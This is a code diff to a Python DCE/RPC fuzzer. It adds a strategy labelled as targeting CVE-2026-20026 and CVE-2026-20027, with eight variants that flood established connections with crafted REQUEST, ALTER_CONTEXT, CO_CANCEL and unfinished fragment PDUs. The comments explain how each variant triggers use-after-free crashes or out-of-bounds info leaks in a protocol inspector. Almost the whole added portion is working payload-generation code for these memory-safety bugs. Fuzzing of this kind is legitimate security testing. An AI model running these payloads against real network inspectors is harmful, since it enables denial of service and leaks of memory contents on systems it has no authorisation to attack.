@@ -51,13 +51,14 @@ DCERPC_STRATEGIES = [
     "record_marking_desync",
     "multi_bind_ack_confusion",
     "uuid_manipulation",
+    "connection_state_uaf",
 ]
 
 # Base weights (raw; normalised downstream). The deepest / highest-yield
 # parser surfaces (fragmentation, bind/context, stub data, auth) get the
 # most mass; edge-case strategies get less.
 DCERPC_WEIGHTS = [
-    12, 14, 8, 10, 10, 12, 6, 7, 5, 10, 4, 8, 6, 7,
+    12, 14, 8, 10, 10, 12, 6, 7, 5, 10, 4, 8, 6, 7, 15,
 ]
 
 DCERPC_STRATEGY_LABELS = {
@@ -75,6 +76,7 @@ DCERPC_STRATEGY_LABELS = {
     "record_marking_desync":       "Record Marking Desync",
     "multi_bind_ack_confusion":    "Multi-BIND_ACK Confusion",
     "uuid_manipulation":           "UUID Manipulation",
+    "connection_state_uaf":         "Connection State UAF (CVE-2026-20026/27)",
 }
 
 
@@ -928,6 +930,144 @@ def build_dcerpc_payload(strategy: str) -> bytes:
             # Same UUID repeated 50 times
             contexts = [(i, _UUID_EPMAPPER, 3, _UUID_NDR, 2) for i in range(50)]
             return _bind_pdu(contexts)
+
+    # ── connection_state_uaf ───────────────────────────────────────────
+    # CVE-2026-20026 (use-after-free read → crash) and CVE-2026-20027
+    # (out-of-bounds read → info leak).  Both triggered by "a large number
+    # of DCE/RPC requests through an established connection" — sustained
+    # REQUEST traffic on a live session that exercises buffer lifecycle bugs.
+    # We model the established connection (BIND) then flood REQUESTs designed
+    # to stress alloc/free/reuse patterns in the inspector's tracking state.
+    elif strategy == "connection_state_uaf":
+        variant = random.choice([
+            "sustained_request_flood", "interleaved_alter_request",
+            "escalating_callid_reuse", "rapid_context_switch",
+            "stub_size_oscillation", "request_cancel_reuse",
+            "multi_opnum_storm", "fragmented_flood",
+        ])
+
+        if variant == "sustained_request_flood":
+            # The core CVE pattern: BIND then hundreds of REQUESTs on the
+            # same connection with escalating call_ids.  The inspector
+            # allocates per-call tracking state; rapid sequential calls
+            # stress the free-list and can trigger use-after-free when a
+            # freed call_id slot is reused before the old buffer is cleared.
+            frames = _bind_pdu()
+            for i in range(random.randint(200, 500)):
+                stub = os.urandom(random.randint(50, 800))
+                frames += _request_pdu(stub, opnum=random.randint(0, 20),
+                                       call_id=i + 1)
+            return frames
+
+        elif variant == "interleaved_alter_request":
+            # BIND, then interleave ALTER_CONTEXT and REQUEST PDUs.
+            # ALTER_CONTEXT reallocates the presentation context table;
+            # a REQUEST referencing the OLD context_id during reallocation
+            # hits the freed buffer (UAF).
+            frames = _bind_pdu()
+            for i in range(150):
+                if i % 3 == 0:
+                    # Switch the presentation context
+                    new_uuid = os.urandom(16) if random.random() < 0.5 else _UUID_SRVSVC
+                    frames += _alter_context_pdu(ctx_id=i % 8,
+                                                 abs_uuid=new_uuid,
+                                                 abs_ver=random.randint(0, 5),
+                                                 call_id=i + 2)
+                else:
+                    # REQUEST referencing a context that may be mid-realloc
+                    frames += _request_pdu(os.urandom(random.randint(100, 600)),
+                                           opnum=random.randint(0, 15),
+                                           context_id=random.randint(0, 7),
+                                           call_id=i + 2)
+            return frames
+
+        elif variant == "escalating_callid_reuse":
+            # Reuse the same call_id across many REQUESTs.  The inspector
+            # allocates tracking state keyed by call_id; sending a new
+            # REQUEST with call_id=N while call_id=N's buffer is still
+            # referenced internally can trigger UAF.
+            frames = _bind_pdu()
+            cid = random.randint(1, 5)
+            for i in range(300):
+                frames += _request_pdu(os.urandom(random.randint(80, 400)),
+                                       opnum=random.randint(0, 10),
+                                       call_id=cid)
+            return frames
+
+        elif variant == "rapid_context_switch":
+            # Bind with multiple contexts, then rapidly switch which context
+            # each REQUEST targets.  Forces the inspector to look up different
+            # context slots on every packet — stresses the hash/array and
+            # can trigger OOB read if the context_id is stale or out-of-range.
+            contexts = [(i, os.urandom(16), random.randint(0, 5),
+                         _UUID_NDR, 2) for i in range(8)]
+            frames = _bind_pdu(contexts)
+            for i in range(250):
+                # Valid context ids 0-7, but occasionally throw an invalid one
+                ctx = random.randint(0, 9)  # 8,9 are OOB
+                frames += _request_pdu(os.urandom(random.randint(50, 300)),
+                                       opnum=random.randint(0, 20),
+                                       context_id=ctx,
+                                       call_id=i + 1)
+            return frames
+
+        elif variant == "stub_size_oscillation":
+            # Alternate between tiny and huge stubs on the same connection.
+            # The inspector's stub reassembly buffer may be freed+reallocated
+            # at different sizes; a read from the old (smaller) buffer after
+            # realloc to a larger one → OOB read (CVE-2026-20027 pattern).
+            frames = _bind_pdu()
+            for i in range(200):
+                if i % 2 == 0:
+                    stub = os.urandom(random.randint(1, 10))   # tiny
+                else:
+                    stub = os.urandom(random.randint(2000, 4000))  # huge
+                frames += _request_pdu(stub, opnum=0, call_id=i + 1)
+            return frames
+
+        elif variant == "request_cancel_reuse":
+            # Send a REQUEST, then CO_CANCEL for its call_id, then reuse
+            # the same call_id immediately.  The cancel frees the tracking
+            # state; the reuse accesses the freed buffer.
+            frames = _bind_pdu()
+            for i in range(100):
+                cid = (i % 10) + 2
+                frames += _request_pdu(os.urandom(random.randint(100, 500)),
+                                       opnum=random.randint(0, 5),
+                                       call_id=cid)
+                frames += _co_cancel_pdu(call_id=cid)
+                # Immediately reuse the just-cancelled call_id
+                frames += _request_pdu(os.urandom(random.randint(50, 200)),
+                                       opnum=random.randint(0, 5),
+                                       call_id=cid)
+            return frames
+
+        elif variant == "multi_opnum_storm":
+            # Flood different opnums on the same context.  Each opnum may
+            # dispatch to a different handler with different buffer expectations.
+            # Rapid switching stresses the dispatch table and can trigger
+            # type-confused buffer reads.
+            frames = _bind_pdu()
+            for i in range(300):
+                frames += _request_pdu(os.urandom(random.randint(50, 500)),
+                                       opnum=random.randint(0, 0xFFFF),
+                                       call_id=i + 1)
+            return frames
+
+        else:  # fragmented_flood
+            # Combine the CVE pattern with fragmentation: send hundreds of
+            # first-fragments with escalating call_ids but NEVER the last
+            # fragment.  The inspector allocates reassembly state for each
+            # call_id, but it is never completed/freed normally.  When the
+            # free-list wraps or is force-flushed, reads from stale pointers
+            # hit freed memory.
+            frames = _bind_pdu()
+            for i in range(400):
+                stub = os.urandom(random.randint(100, 500))
+                frames += _request_pdu(stub, opnum=random.randint(0, 10),
+                                       call_id=i + 2,
+                                       flags=_PFC_FIRST_FRAG)
+            return frames
 
     # ── fallback ────────────────────────────────────────────────────────
     else:
